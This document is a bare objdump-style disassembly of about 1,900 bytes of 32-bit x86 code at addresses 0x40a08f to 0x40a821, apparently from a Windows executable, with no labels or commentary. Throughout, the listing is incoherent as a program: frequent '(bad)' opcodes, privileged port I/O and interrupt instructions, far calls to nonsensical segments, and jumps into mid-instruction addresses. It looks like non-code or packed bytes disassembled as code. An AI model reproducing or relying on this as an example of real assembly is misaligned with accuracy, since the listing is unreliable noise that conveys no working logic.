  40a08f:	test   BYTE PTR [edx-0x1b1112e0],bh
  40a095:	push   ss
  40a096:	mov    edi,0xc7eb087a
  40a09b:	cmp    DWORD PTR [ebx+edx*2],0xf6653d64
  40a0a2:	mov    eax,0x11e7de20
  40a0a7:	inc    eax
  40a0a8:	mov    dl,BYTE PTR [ebx]
  40a0aa:	out    0xc7,al
  40a0ac:	ror    BYTE PTR [edx-0x5b27e1d2],cl
  40a0b2:	pop    esi
  40a0b3:	(bad)  
  40a0b4:	adc    ch,BYTE PTR [eax+0x2]
  40a0b7:	cli    
  40a0b8:	push   0x1e998605
  40a0bd:	imul   ebp,DWORD PTR [ebx+0x52],0x6e
  40a0c1:	loope  0x40a109
  40a0c3:	stc    
  40a0c4:	test   al,0x6c
  40a0c6:	dec    ecx
  40a0c7:	push   ebp
  40a0c8:	je     0x40a0ba
  40a0ca:	in     al,dx
  40a0cb:	cli    
  40a0cc:	repnz imul esi,DWORD PTR [ebp+0x46c820b2],0x324b10aa
  40a0d7:	and    ch,BYTE PTR [esi]
  40a0d9:	dec    esi
  40a0da:	shr    BYTE PTR [ebp+0x72],cl
  40a0dd:	cli    
  40a0de:	or     BYTE PTR [eax+0x669667a1],bh
  40a0e4:	push   ecx
  40a0e5:	(bad)  
  40a0e6:	pop    ebp
  40a0e7:	xor    BYTE PTR [ebp+0x4e],0x71
  40a0eb:	adc    ecx,DWORD PTR [eax+edi*1]
  40a0ee:	or     al,0x92
  40a0f0:	inc    esi
  40a0f1:	xor    eax,0xd2d9ff08
  40a0f6:	loop   0x40a175
  40a0f8:	shl    BYTE PTR [edx],0xf5
  40a0fb:	push   ss
  40a0fc:	mov    edx,0x19608747
  40a101:	sub    DWORD PTR [ecx],edx
  40a103:	xor    al,0x70
  40a105:	sbb    ch,BYTE PTR [ebx]
  40a107:	xchg   ebp,eax
  40a108:	sbb    BYTE PTR [ebx-0xa],0x67
  40a10c:	cmp    ch,BYTE PTR [esi-0x5c51e2fe]
  40a112:	fstp   QWORD PTR ds:0x6a5933f9
  40a118:	cmp    ah,0xa3
  40a11b:	shr    DWORD PTR [edi+0x68324705],0x44
  40a122:	pushf  
  40a123:	and    DWORD PTR [ecx+0x33ab72ce],0x359fda1
  40a12d:	pop    eax
  40a12e:	dec    ebp
  40a12f:	js     0x40a19f
  40a131:	xchg   ebp,eax
  40a132:	loopne 0x40a0e2
  40a134:	adc    DWORD PTR [edi-0x624bdc9f],edx
  40a13a:	shr    DWORD PTR [eax+ebp*4+0x4f],cl
  40a13e:	add    bl,BYTE PTR [edi+0x2db6bfaf]
  40a144:	inc    edx
  40a145:	imul   ebp,DWORD PTR [ebx],0x20fbf94c
  40a14b:	test   BYTE PTR [ecx*2+0x7868d9e3],0xf3
  40a153:	das    
  40a154:	not    BYTE PTR [edx-0x76318be0]
  40a15a:	cmc    
  40a15b:	pop    ss
  40a15c:	stos   DWORD PTR es:[edi],eax
  40a15d:	jp     0x40a188
  40a15f:	in     al,0xa6
  40a161:	cli    
  40a162:	xchg   ebp,eax
  40a163:	push   es
  40a164:	mov    eax,ds:0xc997e37d
  40a169:	sbb    bl,BYTE PTR [eax]
  40a16b:	neg    DWORD PTR [esi]
  40a16d:	shrd   DWORD PTR ds:0x72e3dbf7,esi,cl
  40a174:	daa    
  40a175:	pushf  
  40a176:	mov    ah,ah
  40a178:	imul   ah
  40a17a:	cli    
  40a17b:	fcmovb st,st(6)
  40a17d:	xchg   esi,eax
  40a17e:	cmovnp esp,DWORD PTR [edx+0xf]
  40a182:	sbb    DWORD PTR [eax-0x15],esp
  40a185:	iret   
  40a186:	sbb    eax,0x973aa88
  40a18b:	jns    0x40a18c
  40a18d:	adc    dl,BYTE PTR [ebp+edx*8+0x4d59cfa1]
  40a194:	int    0xf9
  40a196:	fst    DWORD PTR [ecx-0x59b2ec22]
  40a19c:	xchg   esi,eax
  40a19d:	in     al,dx
  40a19e:	inc    edi
  40a19f:	outs   dx,BYTE PTR ds:[esi]
  40a1a0:	sbb    esi,DWORD PTR [esi-0x559296a3]
  40a1a6:	shl    BYTE PTR [ecx],1
  40a1a8:	lahf   
  40a1a9:	sar    DWORD PTR [ebx-0x13],1
  40a1ac:	fisttp DWORD PTR [esi-0x3b12d059]
  40a1b2:	sub    DWORD PTR [edx*8-0x218e5b8],ebx
  40a1b9:	sub    edx,DWORD PTR [eax-0x21]
  40a1bc:	cmp    DWORD PTR [esi+0xf67e0c3],ecx
  40a1c2:	and    DWORD PTR [edi],esi
  40a1c4:	jb     0x40a1d8
  40a1c6:	jle    0x40a217
  40a1c8:	mov    esp,0x1dfa1c1
  40a1cd:	xchg   ebp,eax
  40a1ce:	je     0x40a21a
  40a1d0:	sbb    ebp,edx
  40a1d2:	adc    ecx,ecx
  40a1d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1d5:	pop    eax
  40a1d6:	neg    DWORD PTR [ecx+0x79]
  40a1d9:	sbb    ah,BYTE PTR [edx+0x35251996]
  40a1df:	mov    BYTE PTR [eax],bh
  40a1e1:	or     cl,BYTE PTR [eax]
  40a1e3:	push   ds
  40a1e4:	jecxz  0x40a24d
  40a1e6:	(bad)  
  40a1e7:	pop    ecx
  40a1e8:	jg     0x40a1b5
  40a1ea:	cdq    
  40a1eb:	mov    ebp,0x22167381
  40a1f0:	imul   ebx,DWORD PTR [esi],0xa463f53
  40a1f6:	mov    dh,0xb3
  40a1f9:	fwait
  40a1fa:	add    eax,0xdfbf85ad
  40a1ff:	push   cs
  40a200:	icebp  
  40a201:	or     al,0xc9
  40a203:	scas   eax,DWORD PTR es:[edi]
  40a204:	push   esp
  40a205:	dec    ebp
  40a206:	sar    ecx,1
  40a208:	push   ecx
  40a209:	in     al,0x51
  40a20b:	addr16 cdq 
  40a20d:	stos   BYTE PTR es:[edi],al
  40a20e:	or     BYTE PTR [edx+0x3d],bh
  40a211:	add    al,0x77
  40a213:	pop    ds
  40a214:	jo     0x40a1c8
  40a216:	shr    BYTE PTR [eax+ecx*4+0x6937b070],cl
  40a21d:	cld    
  40a21e:	add    ch,BYTE PTR [edx+0x167e2098]
  40a224:	xchg   edi,eax
  40a225:	pop    edx
  40a226:	js     0x40a28e
  40a228:	bound  eax,QWORD PTR [esi+0x4]
  40a22b:	push   ebx
  40a22c:	xchg   BYTE PTR [edi],dh
  40a22e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a22f:	loop   0x40a269
  40a231:	mov    ch,0x76
  40a233:	add    BYTE PTR [ebx],cl
  40a235:	pop    ebx
  40a236:	repz scas eax,DWORD PTR es:[edi]
  40a238:	stc    
  40a239:	stos   BYTE PTR es:[edi],al
  40a23a:	loope  0x40a2b9
  40a23c:	fs dec edi
  40a23e:	push   ss
  40a23f:	gs loop 0x40a25c
  40a242:	in     eax,dx
  40a243:	cs jg  0xbf94b20a
  40a24a:	jmp    0x40a287
  40a24c:	mov    ebx,0xbae922fb
  40a251:	adc    al,0xcc
  40a253:	es pop esi
  40a255:	pop    es
  40a256:	imul   edi,edx,0xbe6d28a0
  40a25c:	aas    
  40a25d:	sbb    al,0x91
  40a25f:	cli    
  40a260:	jns    0x40a271
  40a262:	rcl    BYTE PTR [ebx+0x3db71591],cl
  40a268:	adc    DWORD PTR ds:0x80cae1af,0xffffff95
  40a26f:	or     BYTE PTR [ebx+0x3e30a2e4],ah
  40a275:	je     0x40a21b
  40a277:	cwde   
  40a278:	ret    
  40a279:	sbb    dh,dl
  40a27b:	or     bh,BYTE PTR [esi]
  40a27d:	(bad)  
  40a27e:	ja     0x40a21f
  40a280:	pusha  
  40a281:	push   ds
  40a282:	sbb    eax,0x24c4dac5
  40a287:	and    ebp,0x3c5f47fa
  40a28d:	call   0xb071:0x626d5cba
  40a294:	xchg   ebx,eax
  40a295:	repz xchg ecx,eax
  40a297:	aaa    
  40a298:	or     BYTE PTR [esi-0x62fca94],ch
  40a29e:	enter  0x306f,0x64
  40a2a2:	mov    ds:0x3d5ce61a,eax
  40a2a7:	xor    edi,DWORD PTR [ecx-0x44]
  40a2aa:	retf   
  40a2ab:	mov    ebp,ecx
  40a2ad:	and    ah,BYTE PTR [ebx+0x2c]
  40a2b0:	pop    es
  40a2b1:	repz pop ds
  40a2b3:	ret    0x72c
  40a2b6:	aas    
  40a2b7:	aas    
  40a2b8:	and    al,0x75
  40a2ba:	add    bh,BYTE PTR [eax-0x21]
  40a2bd:	mov    cl,0x88
  40a2bf:	gs int3 
  40a2c1:	adc    eax,0xba403eb3
  40a2c6:	jg     0x40a2f4
  40a2c8:	in     eax,dx
  40a2c9:	cmc    
  40a2ca:	inc    ebx
  40a2cb:	and    al,0x6e
  40a2cd:	inc    esp
  40a2ce:	scas   eax,DWORD PTR es:[edi]
  40a2cf:	stc    
  40a2d0:	lds    eax,FWORD PTR [ecx-0x6fbaee33]
  40a2d6:	cmp    ebx,esi
  40a2d8:	xor    eax,0x69dd4eeb
  40a2dd:	sbb    eax,0x8f114f6b
  40a2e2:	(bad)  
  40a2e3:	adc    cl,bl
  40a2e5:	fcomp  DWORD PTR ds:[ebp+edx*8-0x2d]
  40a2ea:	fst    QWORD PTR [esi]
  40a2ec:	push   edi
  40a2ed:	mov    ch,BYTE PTR [ebp+0x30]
  40a2f0:	jae    0x40a32f
  40a2f2:	arpl   WORD PTR [esi],bx
  40a2f4:	cdq    
  40a2f5:	pop    ss
  40a2f6:	rcl    eax,0xbd
  40a2f9:	inc    ecx
  40a2fa:	xchg   edi,eax
  40a2fb:	sbb    eax,0x8d246403
  40a300:	sbb    al,0x96
  40a302:	imul   ecx,DWORD PTR [esi+0x2f],0xffffff91
  40a306:	lock inc edi
  40a308:	into   
  40a309:	popf   
  40a30a:	ss test eax,0x868b39ee
  40a310:	pop    esi
  40a311:	mov    edi,DWORD PTR [ebx+0x28e1e5ab]
  40a317:	out    0x96,al
  40a319:	sbb    bh,BYTE PTR [esp+ebx*2+0x7e]
  40a31d:	pushf  
  40a31e:	ss push ecx
  40a320:	into   
  40a321:	and    DWORD PTR [eax-0x22],0xad95d96d
  40a328:	outs   dx,BYTE PTR ds:[esi]
  40a329:	xchg   edx,eax
  40a32a:	test   BYTE PTR [ebx+0x60f1bf67],cl
  40a330:	mov    bh,0x4d
  40a332:	mov    fs,WORD PTR [eax-0x7b749ad]
  40a338:	pop    ss
  40a339:	repz add dh,BYTE PTR [edi+edi*4]
  40a33d:	pop    edx
  40a33e:	cmp    dl,ch
  40a340:	xor    eax,0x22f75ba7
  40a345:	cmp    DWORD PTR [edx+0x5cb8c3b1],0xd6b69376
  40a34f:	test   al,0xd8
  40a351:	push   es
  40a352:	jb     0x40a356
  40a354:	sbb    ch,BYTE PTR [eax+0x2]
  40a357:	sar    DWORD PTR ds:0x8f6e2f36,1
  40a35d:	inc    edi
  40a35e:	lock call 0xc842:0x3ef74af
  40a366:	ds leave 
  40a368:	sbb    bl,BYTE PTR [esi+0x3b]
  40a36b:	sar    BYTE PTR [eiz*4+0x3b42b713],cl
  40a372:	jno    0x40a3ad
  40a374:	shl    dh,0x21
  40a377:	xor    dh,dl
  40a379:	loopne 0x40a368
  40a37b:	ror    DWORD PTR [ebx+0x6e47ff2e],0x74
  40a382:	xor    dh,BYTE PTR ds:0x5b31f63e
  40a388:	pop    edi
  40a389:	std    
  40a38a:	mov    ds:0x128e0f65,al
  40a38f:	pop    esi
  40a390:	rcr    ebx,0xc8
  40a393:	mov    eax,0xbc760d13
  40a398:	(bad)  
  40a399:	or     DWORD PTR [eax+0xaa5300],esp
  40a39f:	scas   eax,DWORD PTR es:[edi]
  40a3a0:	jle    0x40a3f3
  40a3a2:	adc    eax,0xbd23dcb9
  40a3a7:	int    0xef
  40a3a9:	and    BYTE PTR [edi],ch
  40a3ab:	or     ecx,0x286d30b0
  40a3b1:	pop    es
  40a3b2:	mov    ch,0x88
  40a3b4:	push   eax
  40a3b5:	or     eax,0x7e90a342
  40a3ba:	adc    al,0xc
  40a3bc:	pop    edx
  40a3bd:	nop
  40a3be:	(bad)  
  40a3bf:	in     eax,0x96
  40a3c1:	clc    
  40a3c2:	call   0x9d441490
  40a3c7:	popf   
  40a3c8:	cmp    al,0xae
  40a3ca:	xchg   BYTE PTR [esi+0x746ea900],bh
  40a3d0:	push   0xffffffd3
  40a3d2:	(bad)  
  40a3d3:	repz jo 0x40a3e2
  40a3d6:	jmp    0x15ba8a9
  40a3db:	in     eax,0xf7
  40a3dd:	std    
  40a3de:	fs cdq 
  40a3e0:	fadd   st,st(1)
  40a3e2:	dec    eax
  40a3e3:	xor    al,0x5d
  40a3e5:	jmp    0xedd84173
  40a3ea:	sub    DWORD PTR [esi-0x49],ecx
  40a3ed:	lock mov bh,0x19
  40a3f0:	adc    cl,bh
  40a3f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3f3:	scas   al,BYTE PTR es:[edi]
  40a3f4:	xor    eax,0xffffff98
  40a3f7:	mov    edx,0xdbf7514c
  40a3fc:	or     eax,0x5dd08f26
  40a401:	add    eax,0xddc570b1
  40a406:	(bad)  [ebp+0x47e54957]
  40a40c:	inc    ebx
  40a40d:	push   esi
  40a40e:	fwait
  40a40f:	stos   BYTE PTR es:[edi],al
  40a410:	pop    ebp
  40a411:	fucom  st(2)
  40a413:	in     al,dx
  40a414:	popf   
  40a415:	jne    0x40a447
  40a417:	cmc    
  40a418:	cmp    DWORD PTR [ebx+eax*4-0x66],eax
  40a41c:	cs (bad) 
  40a41e:	in     al,dx
  40a41f:	and    al,al
  40a421:	cld    
  40a422:	std    
  40a423:	in     al,0x58
  40a425:	inc    edi
  40a426:	or     DWORD PTR [edi+0x6f],ebp
  40a429:	add    ah,cl
  40a42b:	(bad)  
  40a42c:	sti    
  40a42d:	and    eax,DWORD PTR [edx-0x8bbe5d7]
  40a433:	pop    edx
  40a434:	dec    edx
  40a435:	jno    0x40a3ba
  40a437:	cmp    ebp,DWORD PTR ds:0x5aac577c
  40a43d:	pop    edi
  40a43e:	jge    0x40a3d4
  40a440:	test   BYTE PTR [ecx+0x58505d6d],bl
  40a446:	mov    dl,0xc6
  40a448:	jnp    0x40a44e
  40a44a:	pop    edi
  40a44b:	mov    cs,WORD PTR [ebx*1-0x3b77d1e9]
  40a452:	push   ds
  40a453:	sbb    DWORD PTR [edi-0x75],edx
  40a456:	cmp    ecx,DWORD PTR [ecx]
  40a458:	(bad)  
  40a459:	leave  
  40a45a:	fldz   
  40a45c:	out    0xe0,eax
  40a45e:	outs   dx,DWORD PTR ds:[esi]
  40a45f:	test   eax,0x39bd885e
  40a464:	push   ds
  40a465:	mov    eax,ds:0xf413c0c7
  40a46a:	jecxz  0x40a3f1
  40a46c:	push   DWORD PTR fs:0x51999ee5
  40a473:	dec    ebx
  40a474:	int3   
  40a475:	loopne 0x40a481
  40a477:	mov    dl,0x23
  40a479:	jns    0x40a4cb
  40a47b:	push   ecx
  40a47c:	push   edi
  40a47d:	icebp  
  40a47e:	push   0x60
  40a480:	sub    BYTE PTR [eax],0xae
  40a483:	int3   
  40a484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a485:	mov    cl,0x28
  40a487:	mov    ds:0xe8683714,eax
  40a48c:	sti    
  40a48d:	cmp    eax,0x86bbfacd
  40a492:	es imul edi,ebp,0x7af075be
  40a499:	test   eax,0xd835d11c
  40a49e:	hlt    
  40a49f:	pop    ecx
  40a4a0:	inc    ebp
  40a4a1:	sub    ecx,esp
  40a4a3:	lock mov ch,0xdd
  40a4a6:	neg    DWORD PTR [eax+ecx*2+0x18e55565]
  40a4ad:	mov    ebp,0x946b8112
  40a4b2:	ins    BYTE PTR es:[edi],dx
  40a4b3:	cdq    
  40a4b4:	shl    cx,cl
  40a4b7:	iret   
  40a4b8:	xlat   BYTE PTR ds:[ebx]
  40a4b9:	ins    BYTE PTR es:[edi],dx
  40a4ba:	fisttp WORD PTR [ebx-0x43]
  40a4bd:	mov    bh,0x19
  40a4bf:	xchg   ebx,eax
  40a4c0:	mov    cl,0x2a
  40a4c2:	jne    0x40a4b8
  40a4c4:	push   es
  40a4c5:	inc    ecx
  40a4c6:	add    edi,DWORD PTR [esi-0x74]
  40a4c9:	gs scas al,BYTE PTR es:[edi]
  40a4cb:	adc    ecx,edx
  40a4cd:	or     ecx,DWORD PTR [eax-0x32]
  40a4d0:	das    
  40a4d1:	adc    BYTE PTR [esi+0x2318a62b],ch
  40a4d7:	call   0xcde8:0xd1c4a24a
  40a4de:	hlt    
  40a4df:	mov    bh,0x6f
  40a4e1:	(bad)  
  40a4e2:	not    DWORD PTR [edi-0x30]
  40a4e5:	(bad)  
  40a4e6:	xchg   edi,eax
  40a4e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4e8:	inc    BYTE PTR [ebx-0x8966e4c]
  40a4ee:	call   0x4328:0xcc851b6a
  40a4f5:	lods   al,BYTE PTR ds:[esi]
  40a4f6:	retf   
  40a4f7:	in     eax,dx
  40a4f8:	mov    ebp,0xccddbda5
  40a4fd:	cdq    
  40a4fe:	add    bh,BYTE PTR [edx]
  40a500:	out    0x3e,al
  40a502:	data16 (bad) 
  40a504:	lahf   
  40a505:	mov    cl,0x40
  40a507:	mov    esi,0x195ab812
  40a50c:	mov    ebx,0xd6575623
  40a511:	jmp    FWORD PTR [eax]
  40a513:	jo     0x40a58a
  40a515:	inc    edi
  40a516:	pop    edi
  40a517:	cmp    BYTE PTR [eax-0x4c20e2e0],0x1a
  40a51e:	xor    al,0xdf
  40a520:	test   ah,bl
  40a522:	sahf   
  40a523:	outs   dx,BYTE PTR ds:[esi]
  40a524:	cmp    ebp,ecx
  40a526:	mov    ah,0xd3
  40a528:	(bad)  
  40a529:	fdivrp st(6),st
  40a52b:	inc    eax
  40a52c:	add    ecx,ebx
  40a52e:	pop    es
  40a52f:	stos   BYTE PTR es:[edi],al
  40a530:	adc    BYTE PTR [eax+eax*4-0x366008b7],dh
  40a537:	rcr    BYTE PTR [ebx],0x93
  40a53a:	rcl    esi,1
  40a53c:	js     0x40a4f1
  40a53e:	push   eax
  40a53f:	inc    esp
  40a540:	jo     0x40a500
  40a542:	mul    DWORD PTR [ebx-0x429d4c7f]
  40a548:	call   0x221e7976
  40a54d:	pop    edx
  40a54e:	pop    esp
  40a54f:	jp     0x40a5a8
  40a551:	leave  
  40a552:	inc    edx
  40a553:	iret   
  40a554:	and    al,0x98
  40a556:	leave  
  40a557:	rcr    ch,0x2a
  40a55a:	fwait
  40a55b:	leave  
  40a55c:	(bad)  
  40a55d:	mov    ds:0x4ebaade9,al
  40a562:	pop    es
  40a563:	dec    esi
  40a564:	fstp   TBYTE PTR [edx]
  40a566:	clc    
  40a567:	mov    edi,0xf48a1c7
  40a56c:	ret    0xeb4a
  40a56f:	jmp    0xab:0x7f57d4a6
  40a576:	mov    ds:0xc73ae313,al
  40a57b:	out    0x89,eax
  40a57d:	shr    BYTE PTR [esi],cl
  40a57f:	lahf   
  40a580:	pop    ebp
  40a581:	xor    BYTE PTR [eax+0x64],bl
  40a584:	lea    edx,[edi]
  40a586:	test   al,dh
  40a588:	aad    0xb9
  40a58a:	mov    ebx,0x7d608304
  40a58f:	mov    ebx,0x834a42cd
  40a594:	in     al,0x4e
  40a596:	(bad)  
  40a597:	sbb    al,0x97
  40a599:	and    edx,DWORD PTR [ebx+0x44]
  40a59c:	scas   eax,DWORD PTR es:[edi]
  40a59d:	dec    esp
  40a59e:	into   
  40a59f:	sbb    eax,0xe15c4bca
  40a5a4:	mov    ch,0xed
  40a5a6:	pop    ecx
  40a5a7:	inc    ecx
  40a5a8:	pop    ebx
  40a5a9:	cdq    
  40a5aa:	push   ebx
  40a5ab:	cmp    BYTE PTR [edi+0x14],dl
  40a5ae:	mov    ds:0x5668a223,al
  40a5b3:	fnsave [esi-0x5083153e]
  40a5b9:	push   edx
  40a5ba:	cli    
  40a5bb:	repnz nop
  40a5bd:	mov    eax,ds:0xc17b29e0
  40a5c2:	loop   0x40a57a
  40a5c4:	or     esp,ecx
  40a5c6:	pop    ds
  40a5c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5c8:	or     eax,0xdfd82ae9
  40a5cd:	jge    0x40a551
  40a5cf:	es sti 
  40a5d1:	clc    
  40a5d2:	xor    eax,0x32483ab6
  40a5d7:	in     al,dx
  40a5d8:	fadd   st,st(4)
  40a5da:	push   ecx
  40a5db:	add    al,0xfc
  40a5dd:	retf   
  40a5de:	xor    BYTE PTR [edx+edi*4],bl
  40a5e1:	push   ecx
  40a5e2:	dec    ecx
  40a5e3:	iret   
  40a5e4:	add    eax,0x1180ccd
  40a5e9:	push   edx
  40a5ea:	cld    
  40a5eb:	ins    BYTE PTR es:[edi],dx
  40a5ec:	xchg   edx,eax
  40a5ee:	xchg   ebp,eax
  40a5ef:	in     al,0x4a
  40a5f1:	arpl   WORD PTR [ebp+0x380a8e5c],dx
  40a5f7:	in     al,0x3f
  40a5f9:	adc    BYTE PTR [esi],al
  40a5fb:	in     al,0x35
  40a5fd:	in     eax,0x74
  40a5ff:	sub    dh,BYTE PTR [edx-0x6b48c37c]
  40a605:	sbb    ah,dh
  40a607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a608:	lahf   
  40a609:	sub    al,0x1b
  40a60b:	(bad)  
  40a60c:	and    BYTE PTR [ebp+0x71651b56],al
  40a612:	(bad)  
  40a613:	ds das 
  40a615:	xor    eax,0xfdd55d7a
  40a61a:	lahf   
  40a61b:	cmp    BYTE PTR [edi],ah
  40a61d:	or     ah,BYTE PTR [eax+0x43]
  40a620:	int    0x8
  40a622:	(bad)  [edx]
  40a624:	nop
  40a625:	out    dx,al
  40a626:	dec    eax
  40a627:	sub    ch,BYTE PTR [ecx-0x39]
  40a62a:	mov    bh,BYTE PTR [eax]
  40a62c:	mov    ah,0xf0
  40a62e:	jecxz  0x40a5eb
  40a630:	xor    BYTE PTR [eax+0x7861a2ee],0xbc
  40a637:	dec    esp
  40a638:	add    DWORD PTR [ebx+edx*4+0x76e15c6c],edx
  40a63f:	jnp    0x40a5cb
  40a641:	jnp    0x40a5c9
  40a643:	(bad)  
  40a644:	call   0x4660:0xf49a14f
  40a64b:	das    
  40a64c:	cmp    al,0xf8
  40a64e:	and    ebp,DWORD PTR [ecx+0x6a3e3933]
  40a654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a655:	and    bl,ch
  40a657:	inc    ecx
  40a658:	outs   dx,DWORD PTR ds:[esi]
  40a659:	inc    edi
  40a65a:	dec    ebp
  40a65b:	bound  edx,QWORD PTR [eax+0x5c]
  40a65e:	pop    ebp
  40a65f:	sahf   
  40a660:	shl    DWORD PTR [esi-0xb],cl
  40a663:	inc    edi
  40a664:	call   0x2e7b26e2
  40a669:	seta   dl
  40a66c:	js     0x40a641
  40a66e:	xor    ch,dl
  40a670:	add    DWORD PTR [eax+edx*4+0x699b45aa],ebx
  40a677:	push   ss
  40a678:	sub    al,0x33
  40a67a:	test   BYTE PTR [esi+eiz*1+0x38],bl
  40a67e:	rol    DWORD PTR [esi+0x31],0x4e
  40a682:	js     0x40a620
  40a684:	push   esi
  40a685:	daa    
  40a686:	test   DWORD PTR cs:[ebx],edx
  40a689:	iret   
  40a68a:	hlt    
  40a68b:	xor    al,0xc3
  40a68d:	or     DWORD PTR [edx+0x21],0xd8bd0031
  40a694:	cmp    eax,0x8bda9017
  40a699:	aad    0xdc
  40a69b:	ins    DWORD PTR es:[edi],dx
  40a69c:	jne    0x40a659
  40a69e:	push   edx
  40a69f:	ror    DWORD PTR [edx],cl
  40a6a1:	ds inc ecx
  40a6a3:	test   al,0x44
  40a6a5:	cmp    dh,dh
  40a6a7:	xor    eax,0xf19485fa
  40a6ac:	popa   
  40a6ad:	inc    esi
  40a6ae:	enter  0x5397,0xdc
  40a6b2:	pop    ss
  40a6b3:	dec    ebx
  40a6b4:	test   DWORD PTR [edi+0x41],esp
  40a6b7:	lods   al,BYTE PTR ds:[esi]
  40a6b8:	mov    DWORD PTR [ebx],esp
  40a6ba:	sahf   
  40a6bb:	xchg   esp,eax
  40a6bc:	push   ebx
  40a6bd:	(bad)  
  40a6be:	or     eax,0xb9fae946
  40a6c3:	or     DWORD PTR [edx-0x111742af],ebp
  40a6c9:	push   ebp
  40a6ca:	loope  0x40a6ea
  40a6cc:	jl     0x40a71b
  40a6ce:	ja     0x40a68a
  40a6d0:	les    esi,FWORD PTR [edi-0x19]
  40a6d3:	push   ebp
  40a6d4:	mov    ebx,0xc32a77ec
  40a6d9:	stos   BYTE PTR es:[edi],al
  40a6da:	test   eax,0xca59f035
  40a6df:	pushf  
  40a6e0:	arpl   ax,cx
  40a6e2:	pop    edx
  40a6e3:	xchg   ecx,eax
  40a6e4:	sub    al,0xf
  40a6e6:	in     al,dx
  40a6e7:	dec    edi
  40a6e8:	jb     0x40a6b1
  40a6ea:	push   es
  40a6eb:	sysret 
  40a6ed:	push   edi
  40a6ee:	push   es
  40a6ef:	mov    ch,0x18
  40a6f1:	push   esp
  40a6f2:	mov    esi,0xf99ca2b8
  40a6f7:	xor    al,0x3b
  40a6f9:	xor    al,0x1c
  40a6fb:	int3   
  40a6fc:	outs   dx,BYTE PTR ds:[esi]
  40a6fd:	in     al,0xb4
  40a6ff:	(bad)  
  40a700:	in     eax,0x3a
  40a702:	push   ss
  40a703:	int    0x3b
  40a705:	(bad)
  40a708:	push   ebx
  40a709:	and    esi,DWORD PTR [edx-0x2a161103]
  40a70f:	sti    
  40a710:	mov    al,ds:0xe2f1871
  40a715:	popf   
  40a716:	sti    
  40a717:	xchg   ecx,eax
  40a718:	addr16 pop es
  40a71a:	imul   ecx,DWORD PTR [eax],0xffffff8b
  40a71d:	arpl   WORD PTR [ecx+0x76],bx
  40a720:	retf   
  40a721:	std    
  40a722:	pop    esp
  40a723:	cmp    BYTE PTR [ebx],dh
  40a725:	mov    ebp,0xb08a49f2
  40a72a:	mov    cl,0xcf
  40a72c:	xor    al,0xb9
  40a72e:	dec    ebp
  40a72f:	push   cs
  40a730:	jns    0x40a6fe
  40a732:	mov    ds:0x70f4aa6b,eax
  40a737:	mov    bl,0x1a
  40a739:	test   BYTE PTR [ecx-0x35],cl
  40a73c:	neg    esp
  40a73e:	push   ds
  40a73f:	pop    esi
  40a740:	jp     0x40a6c8
  40a742:	add    dl,BYTE PTR [ecx*1-0x66e575eb]
  40a749:	(bad)  
  40a74a:	icebp  
  40a74b:	sub    DWORD PTR [edx*8+0x1d9aed53],0xd842e4b2
  40a756:	dec    ecx
  40a757:	mov    ebx,0xc92f352f
  40a75c:	mov    WORD PTR [ebx-0x27bab96d],?
  40a762:	push   esp
  40a763:	or     esp,edi
  40a765:	pop    ecx
  40a766:	icebp  
  40a767:	mov    al,ds:0x2c23eb63
  40a76c:	mov    ds:0x54d9cc41,al
  40a771:	add    cl,BYTE PTR ds:0xcc374e7e
  40a777:	(bad)  
  40a778:	popf   
  40a779:	xchg   ecx,eax
  40a77a:	and    eax,0x5608530f
  40a77f:	and    eax,0xd3c210fa
  40a784:	xor    al,0xfa
  40a786:	jbe    0x40a7f3
  40a788:	into   
  40a789:	pop    edi
  40a78a:	loope  0x40a769
  40a78c:	dec    edi
  40a78d:	jo     0x40a759
  40a78f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a790:	xor    DWORD PTR [ecx+0x68],0x26a7d357
  40a797:	sub    DWORD PTR [esi-0xf],0xffffffb7
  40a79b:	pop    es
  40a79c:	retf   0xa054
  40a79f:	cli    
  40a7a0:	pop    edx
  40a7a1:	aam    0x48
  40a7a3:	mov    esp,DWORD PTR [ebp+0x1b]
  40a7a6:	jecxz  0x40a76d
  40a7a8:	lods   eax,DWORD PTR ds:[esi]
  40a7a9:	test   BYTE PTR [eax-0x6b],dl
  40a7ac:	(bad)  
  40a7ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7af:	in     al,dx
  40a7b0:	ret    
  40a7b1:	pop    ss
  40a7b2:	push   ds
  40a7b3:	fadd   st(1),st
  40a7b5:	xchg   BYTE PTR [esi-0x7efe0fcd],bh
  40a7bb:	mov    WORD PTR [edi+eiz*1],?
  40a7be:	out    dx,eax
  40a7bf:	pop    esp
  40a7c0:	loop   0x40a7c4
  40a7c2:	adc    eax,0xea63ebb8
  40a7c7:	or     eax,0x59d3248a
  40a7cc:	mov    edi,0x6f9d6e72
  40a7d1:	push   0x5ae79d55
  40a7d6:	int    0xb3
  40a7d8:	leave  
  40a7d9:	xchg   ebp,eax
  40a7da:	daa    
  40a7db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7dc:	mov    edi,0x6ae5e5db
  40a7e1:	aam    0xf7
  40a7e3:	div    BYTE PTR [edi]
  40a7e5:	add    dh,BYTE PTR [ecx+eiz*1-0x71de04b]
  40a7ec:	int    0x66
  40a7ee:	cmp    DWORD PTR [edi+0x2f447122],ebp
  40a7f4:	add    al,BYTE PTR [ecx-0x4a78be8b]
  40a7fa:	pop    esi
  40a7fb:	or     BYTE PTR [eax],ch
  40a7fd:	leave  
  40a7fe:	cmp    DWORD PTR [ebp-0x76469821],ebp
  40a804:	xor    cl,bh
  40a806:	jb     0x40a7e3
  40a808:	or     dl,BYTE PTR [eax]
  40a80a:	sar    al,1
  40a80c:	pop    eax
  40a80d:	dec    ebx
  40a80e:	pop    esp
  40a80f:	cmp    BYTE PTR [esi+0xd],cl
  40a812:	aad    0xfe
  40a814:	pop    ebx
  40a815:	jne    0x40a7c8
  40a817:	xchg   ebp,eax
  40a818:	push   esi
  40a819:	xchg   esp,eax
  40a81a:	sub    DWORD PTR [edi+esi*4+0x4c178168],esi
  40a821:	pop    ecx
